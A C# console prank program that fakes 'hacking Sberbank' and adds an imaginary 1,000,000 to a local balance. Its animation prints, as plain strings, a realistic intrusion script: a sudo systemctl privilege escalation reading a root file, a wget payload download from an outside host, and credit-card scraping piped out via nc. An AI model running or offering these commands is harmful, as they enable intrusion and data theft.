using System.Collections.Generic;
using System;
using System.Threading;

namespace TermuxTest
{
    internal class Program
    {
        private static BankBalance _bankBalance = new BankBalance(38403m);

        static void Main(string[] args)
        {
            string userInput;
            bool isWorking = true;

            List<string> title = new List<string>
            {
                "______ _   _______  ___   _   __  ___________ ___________   _   _   ___  _____  _   __",
                "|  _  \\ | | | ___ \\/ _ \\ | | / / /  ___| ___ \\  ___| ___ \\ | | | | / _ \\/  __ \\| | / /",
                "| | | | | | | |_/ / /_\\ \\| |/ /  \\ `--.| |_/ / |__ | |_/ / | |_| |/ /_\\ \\ /  \\/| |/ / ",
                "| | | | | | | ___ \\  _  ||    \\   `--. \\ ___ \\  __||    /  |  _  ||  _  | |    |    \\ ",
                "| |/ /| |_| | |_/ / | | || |\\  \\ /\\__/ / |_/ / |___| |\\ \\  | | | || | | | \\__/\\| |\\  \\",
                "|___/  \\___/\\____/\\_| |_/\\_| \\_/ \\____/\\____/\\____/\\_| \\_| \\_| |_/\\_| |_/\\____/\\_| \\_/"
            };

            ShowAnimatedTitle(title, 1);

            Console.WriteLine();

            while (isWorking)
            {
                Console.Clear();
                ShowTitle(title);

                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("Chose an option:\n" +
                    "1. Hack Sberbank\n" +
                    "2. Check Balance\n" +
                    "3. Transfer Money\n" +
                    "4. Exit");

                userInput = Console.ReadLine();

                switch (userInput)
                {
                    case "1":
                        Console.WriteLine("Hacking Sberbank...");
                        SimulateHacking();
                        _bankBalance.Deposit(1000000m);
                        Console.WriteLine("Deposit complete. 1,000,000 added to your account.");
                        Console.ReadLine();
                        break;
                    case "2":
                        Console.WriteLine($"Your balance is {_bankBalance.GetBalance()}");
                        Console.ReadLine();
                        break;
                    case "3":
                        Console.WriteLine($"Balance: {_bankBalance.GetBalance()}");
                        Console.WriteLine("Fill in the recipient field");
                        string recipient = Console.ReadLine();
                        Console.WriteLine($"Enter the amount to transfer");
                        decimal transferAmount;

                        while (!decimal.TryParse(Console.ReadLine(), out transferAmount))
                        {
                            Console.WriteLine("Invalid amount. Please enter a valid decimal number.");
                            continue;
                        }

                        Console.WriteLine("Transferring money...");

                        if (_bankBalance.Withdraw(500000m))
                        {
                            Console.WriteLine($"Transfer to {recipient} was successful.");
                        }
                        else
                        {
                            Console.WriteLine("Insufficient funds for transfer.");
                        }
                        break;
                    case "4":
                        Console.WriteLine("Exiting...");
                        isWorking = false;
                        break;
                    default:
                        Console.WriteLine("Invalid option.");
                        break;
                }
            }
        }

        static void ShowAnimatedTitle(List<string> title, int delta)
        {
            Console.ForegroundColor = ConsoleColor.Red;

            foreach (var line in title)
            {
                foreach (char c in line)
                {
                    Console.Write(c);
                    Thread.Sleep(delta);
                }
                Console.WriteLine();
            }

            Console.ResetColor();
        }

        static void ShowTitle(List<string> title)
        {
            Console.ForegroundColor = ConsoleColor.Red;

            foreach (var line in title)
            {
                Console.WriteLine(line);
            }

            Console.ResetColor();
        }

        static void SimulateHacking()
        {
            Random random = new Random();
            List<ConsoleColor> colors = new List<ConsoleColor>
            {
                ConsoleColor.Red,
                ConsoleColor.Green,
                ConsoleColor.Blue,
                ConsoleColor.Yellow
            };

            List<string> hackingSteps = new List<string>
           {
               "darknode@phantom:~$ ssh -o StrictHostKeyChecking=no -i /dev/null jsmith@internal-dev.vertex-corp.com",
               "Warning: Permanently added 'internal-dev.vertex-corp.com,192.168.5.22' (ED25519) to the list of known hosts.",
               "jsmith@internal-dev.vertex-corp.com's password:",
               "Permission denied, please try again.\r\njsmith@internal-dev.vertex-corp.com's password:",
               "Last login: Wed Oct 25 22:15:01 2024 from 10.2.3.4\r\njsmith@dev-server:~$",
               "jsmith@dev-server:~$ sudo -l\r\n[sudo] password for jsmith:\r\n",
               "User jsmith may run the following commands on dev-server:\r",
               "\n    (ALL) NOPASSWD: /usr/bin/systemctl status *\r\njsmith@dev-server:~$",
               "jsmith@dev-server:~$ TF=$(mktemp)\r\njsmith@dev-server:~$ echo '[Service]\r\nExecStart=/bin/sh -c \"cat /root/root_flag.txt > /tmp/stolen_data.log 2>&1; chmod 777 /tmp/stolen_data.log\"",
               "Type=oneshot\r\n[Install]\r\nWantedBy=multi-user.target' > $TF\r",
               "\njsmith@dev-server:~$ sudo systemctl link $TF",
               "Created symlink /etc/systemd/system/tmp.y7s8d0.service → /tmp/tmpfile.y7s8d0.\r\njsmith@dev-server:~$ sudo systemctl enable --now $TF\r\nCreated symlink /etc/systemd/system/multi-user.target.wants/tmp.y7s8d0.service → /tmp/tmpfile.y7s8d0.",
               "jsmith@dev-server:~$ cat /tmp/stolen_data.log\r",
               "\nVERTEX_CORP_ROOT_FLAG: SKR{7h3_5y573m_15_br0k3n}\r",
               "\njsmith@dev-server:~$ rm $TF",
               "jsmith@dev-server:~$ exit\r\nlogout\r",
               "\nConnection to internal-dev.vertex-corp.com closed.\r\ndarknode@phantom:~$",
               "darknode@phantom:~$ wget --no-check-certificate https://transfer.secure-shd.net/payloads/phantom_scraper.tar.gz.enc\r",
               "\n--2024-10-26 03:15:22--  https://transfer.secure-shd.net/payloads/phantom_scraper.tar.gz.enc",
               "Resolving transfer.secure-shd.net (transfer.secure-shd.net)... 185.172.3.11\r",
               "\nConnecting to transfer.secure-shd.net (transfer.secure-shd.net)|185.172.3.11|:443... connected.",
               "HTTP request sent, awaiting response... 200 OK\r",
               "\nLength: 7482912 (7.1M) [application/octet-stream]\r\nSaving to: ‘phantom_scraper.tar.gz.enc’",
               "phantom_scraper.tar.gz.enc     100%[=================================================>]   7.14M  2.14MB/s    in 3.3s",
               "2024-10-26 03:15:26 (2.14 MB/s) - ‘phantom_scraper.tar.gz.enc’ saved [7482912/7482912]\r",
               "\n\r\ndarknode@phantom:~$",
               "arknode@phantom:~$ openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -salt -in phantom_scraper.tar.gz.enc -out phantom_scraper.tar.gz -pass pass:SKR{7h3_5y573m_15_br0k3n}\r\ndarknode@phantom:~$ tar -xzvf phantom_scraper.tar.gz\r\nphantom_scraper/\r\nphantom_scraper/modules/\r\nphantom_scraper/modules/credit_card_scraper.so\r\nphantom_scraper/modules/keylogger.so\r\nphantom_scraper/phantom\r\nphantom_scraper/config.json\r\ndarknode@phantom:~$ cd phantom_scraper && ./phantom --help\r\nPhantom Scraper v2.1 - Memory-resident data extraction tool.\r\nUsage: ./phantom [OPTIONS] -t <target_process>\r\n  -t, --target <process_name>   Target process to inject into.\r\n  -m, --module <module_path>    Module to load (e.g., keylogger, scraper).\r\n  -s, --stealth                 Enable stealth mode (anti-forensics).\r\n  -h, --help                    Display this help message.\r\n\r\ndarknode@phantom:~$",
               "darknode@phantom:~$ nc -lvnp 4444 > /dev/null &\r\n[1] 30123\r",
               "\ndarknode@phantom:~$ ./phantom -t banking_app -m ./modules/credit_card_scraper.so -s\r",
               "\n[*] Attaching to process: banking_app (PID: 8821)\r\n[*] Module './modules/credit_card_scraper.so' loaded successfully.\r",
               "\n[*] Injection point found. Hijacking syscall table...\r\n[*] Hook installed. Intercepting read() calls...\r",
               "\n[*] Data stream active. Piping to nc 10.0.2.15:4444...\r\n[+] Exfiltrating...",
           };

            foreach (var step in hackingSteps)
            {
                Thread.Sleep(random.Next(100, 1000));
                Console.ForegroundColor = colors[random.Next(0, colors.Count)];
                Console.WriteLine(step);
            }

            Console.WriteLine("Collect all money:");

            Console.ForegroundColor = ConsoleColor.Green;

            for (int i = 0; i <= 100; i++)
            {
                Thread.Sleep(random.Next(10, 300));
                Console.WriteLine($"Collecting... - {i}%");
            }

            Console.WriteLine("Hack complete. All money collected.");
        }
    }

    public class BankBalance
    {
        private decimal _balance;
        public BankBalance(decimal initialBalance)
        {
            _balance = initialBalance;
        }
        public decimal GetBalance()
        {
            return _balance;
        }
        public void Deposit(decimal amount)
        {
            if (amount > 0)
            {
                _balance += amount;
            }
        }
        public bool Withdraw(decimal amount)
        {
            if (amount > 0 && amount <= _balance)
            {
                _balance -= amount;
                return true;
            }
            return false;
        }
    }
}